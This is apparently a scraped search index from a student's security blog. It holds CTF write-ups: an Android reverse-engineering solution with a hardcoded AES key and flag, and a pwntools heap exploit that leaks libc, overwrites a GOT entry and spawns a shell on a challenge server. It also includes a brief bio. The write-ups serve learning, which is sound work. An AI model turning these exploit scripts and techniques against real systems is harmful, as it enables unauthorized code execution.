#pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+\"A\"*7 except: p.close() continue pause() p.recv() p.sendline(\"1234\") pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,'\\x00') p.recv() p.sendline(pay) p.interactive()   Mission Impossible (Rev, 246pts)  extract apk and convert dex to jar using dex2jar tools. There’s nothing ….:( find hidden dex files in `MissionImpossibleTheme.mp3. Get this Code with jd-gui.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  package thcon21.ctf.payload; import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec; public class MIRead { private static final String CIPHER_ALGO = \"AES/GCM/NoPadding\"; private static final String IV = \"your_m1ssi0n\"; private static final String KEY = \"d0_you_acc3pt_it\"; private Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\"); private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, \"your_m1ssi0n\".getBytes(\"utf-8\")); private SecretKeySpec secretKeySpec = new SecretKeySpec(\"d0_you_acc3pt_it\".getBytes(\"utf-8\"), \"AES\"); public MIRead() throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException {} public String decrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { paramString = Base64.decode(paramString.getBytes(\"UTF-8\"), 0); this.cipher.init(2, this.secretKeySpec, this.parameterSpec); return new String(this.cipher.doFinal(paramString)); } public String encrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { this.cipher.init(1, this.secretKeySpec, this.parameterSpec); return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(\"utf-8\")), 0)); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public static void main(String[] paramArrayOfString) { testFlag(); paramArrayOfString = paramArrayOfString[0]; while (0 != 0) {} Object localObject = new StringBuilder(); ((StringBuilder)localObject).append(\"IkUegPuai+gfBce7nTf\"); if (\"IkUegPuai+gfBce7nTf\" != \"VEhDb24yMQo=\") { ((StringBuilder)localObject).append(\"CkMZzZSwne3X3mnyrc5oBcD2yGHUXy\"); } else { ((StringBuilder)localObject).append(\"MissionImpossible\"); return; } ((StringBuilder)localObject).append(\"MMcjCaXX2AAY20H\"); localObject = ((StringBuilder)localObject).toString(); if (paramArrayOfString.equals(\"MissionImpossible\")) { System.out.println((String)localObject); } }   The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H.\nThen, how to decrypt? → this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  from Crypto.Cipher import AES import base64 def print_hex_bytes(name, byte_array): print('{} len[{}]: '.format(name, len(byte_array)), end='') for idx, c in enumerate(byte_array): print(\"{:02x}\".format(int(c)), end='') print(\"\") def dec(key, aad, nonce, cipher_data, mac): print('\\nenter dec function ---------------------------------') cipher = AES.new(key, AES.MODE_GCM, nonce) try: plain_data = cipher.decrypt(cipher_data) print_hex_bytes('plain_data', plain_data) print('exit dec function ---------------------------------') return plain_data except ValueError: print (\"Key incorrect\") print('exit dec function ---------------------------------') return None if __name__ == \"__main__\": key = b\"d0_you_acc3pt_it\" aad = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) # nonce = b\"your_m1ssi0n\" cipher_data = base64.b64decode(b\"IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H\") mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8]) print_hex_bytes('key', key) print_hex_bytes('aad', aad) print_hex_bytes('nonce', nonce) print_hex_bytes('cipher data', cipher_data) print_hex_bytes('mac', mac) result = dec(key, aad, nonce, cipher_data, mac) if result is not None: print('\\nDecrypted value:') print_hex_bytes('\\tresult(plain data)', result)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8 enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function --------------------------------- Decrypted value: result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u003e\u003e\u003e bytes.fromhex(\"5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63\") b'THCon21{Th1s-Was-Poss1ble-For-U}\\x8c\\x0c\\xdab\\xbc\\x92\\x13V\\xee5m\\xa0\\xfeE}c'   [END]\n","description":"","tags":[],"title":"thcctf Pwn-Rev write-up","uri":"/posts/thcctf_2021_pwn_rev/"},{"categories":["ctf"],"content":"Tasks  Pwn  Just Another Heap (500pts)     I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.\n It has 5 user functions(create, relive, forget, change, listing).  create() has a role that makes malloc_frame(0x20) and malloc_userinput(size).\nThe point is, this prob has a unique fading input with this part.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  puts(\"How long is your memory\"); input_lu(\u0026size); // no size check malloc_user = malloc(size); // size \u003e 0x308 / forget -\u003e unsorted bin puts(\"Sometimes our memories fade and we only remember parts of them.\"); input_lu(\u0026fade); // no filter puts(\"Would you like to leave some space at the beginning in case you remember later?\"); if ( fade \u003c= size ) { if ( malloc_user ) { for ( i = 0; i \u003c fade; ++i ) malloc_user[i] = '_'; } malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0.\nSo, if malloc(size) returns 0, I can overwrite anywhere.\nExploit First, set chunks that size\u003e0x408 between 2 small chunks\nto leak libc from main_arena+xx.\nAnd make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.\nand if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.\n change() function : overwrite from the beginning or behind fade _ strings relive() function : print user input with fade _ string  Finally, Use This mentioned skills to do GOT Overwriting.\n memories will be faded fade bytes with _, and user input is behind the _ strings\nif malloc_user is NOT 0.\nSo, if malloc(size) returns 0, I can overwrite anywhere.\n input /bin/sh\\x00 in malloc_frame[] and program will call strcspn(addr,'\\n'). Get The Shell.\nCode Here is the Exploit Code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76  from pwn import * context.log_level='debug' def create(idx, name, size, hide, cont, important, recent): p.recv() p.sendline(str(1)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(name) p.recv() p.sendline(str(size)) p.recv() p.sendline(str(hide)) p.recv() p.sendline(cont) p.recv() p.sendline(important) p.recv() p.sendline(recent) def relive(idx): p.recv() p.sendline(str(2)) p.recv() p.sendline(str(idx)) def change(idx, cont): p.recv() p.sendline(str(4)) p.recv() p.sendline(str(idx)) p.recv() p.sendline(\"Y\") p.recv() p.send(cont) def forget(idx): p.recv() p.sendline(str(3)) p.recv() p.sendline(str(idx)) def listing(): p.recv() p.sendline(str(5)) p=remote(\"dctf-chall-just-another-heap.westeurope.azurecontainer.io\", 7481) #p=process(\"./just_another_heap\") e=ELF(\"./just_another_heap\") l=e.libc create(0, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") create(1, \"B\"*8, 0x410, 0, \"1234\", \"N\", \"N\") create(2, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") forget(0) forget(1) #pause() create(3, \"B\"*8, 0x410, 6, \"\", \"N\", \"N\") #pause() change(3,\"A\"*8) relive(3) p.recvuntil(\"A\"*7+\" \") libc_base=u64(p.recv(6).ljust(8,'\\x00'))-0x3ebca0 print hex(libc_base) create(4, \"C\"*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), \"N\", \"N\") pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(\"//bin/sh\\x00\") p.interactive()   ","description":"","tags":[],"title":"dctf Pwn Write-up","uri":"/posts/dctf_2021_just_another_heap/"},{"categories":["etc"],"content":"My second github blog start And using hugo It was fun! And it can be set easily~ ","description":"","tags":["hello","world"],"title":"Start","uri":"/posts/start/"},{"categories":null,"content":"Ainsetin 💯 hi, I'm from South Korea. I study Coding and Pwnable, etc.\n 2019-2021 Korea Digital Media High School 18th (3rd Grade) 2020 STEALTH Club Leader 2021.04- TeamH4C, Team ST4RT Pwner   Stats 💻 At First, I study Coding and Algorithm(PS) with a little Math. but I nearly quit studying this topic and do Hacking Tech Study. I usually practice pwnable wargame in pwnable.tw, pwnable.xyz, pwn.college. I also study lectures with Dreamhack hard and keep solving their wargame.\n Awards 🎖  2016-2018 Korea Olympiad of Informatics Bronze Award🥉 2018 EDAILY Coding Challenge Finalist 2019-2020 Korea Olympiad of Informatics 4th Award 2020 Kookmin Univ. Algorighm Competition Finalist, 4th Award 2020 Kyunghee Univ. Algorithm Competition Finalist The Hacking Championship Junior 2020 Bronze Award🥉 (8th) 2020 Youth Information Security Festival 🥇 (1st) 2021 Shakticon CTF 4th 2021 TRUST CTF Bronze Award🥉 (3th) 2021 Hspace CTF 5th 2021 Korea High school Cyber Security Competition(aka ANUSEC) 🥇 (2nd - The best prize) 2021 Incognito CTF 4th  ","description":"","tags":null,"title":"Ainset.in","uri":"/about/"}]
